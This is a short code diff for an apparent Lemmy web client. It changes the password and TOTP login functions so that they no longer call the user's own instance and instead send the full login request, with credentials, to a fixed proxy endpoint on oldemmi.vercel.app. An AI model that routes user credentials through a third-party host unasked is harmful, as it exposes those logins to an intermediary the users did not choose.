@@ -59,6 +59,7 @@
             }
 
             const loginData = {
+                url: `https://${instance.value}/api/v3/user/login`,
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: {
@@ -67,7 +68,7 @@
                 }
             };
 
-            fetch(`https://${instance.value}/api/v3/user/login`, {
+            fetch("https://oldemmi.vercel.app/api/server.js", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(loginData)
@@ -104,6 +105,7 @@
 
         function handleTotpLogin(totpCode, username, password, instance) {
             const totpLoginData = {
+                url: `https://${instance.value}/api/v3/user/login`,
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: {
@@ -113,7 +115,7 @@
                 }
             };
 
-            fetch(`https://${instance.value}/api/v3/user/login`, {
+            fetch("https://oldemmi.vercel.app/api/server.js", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(totpLoginData)
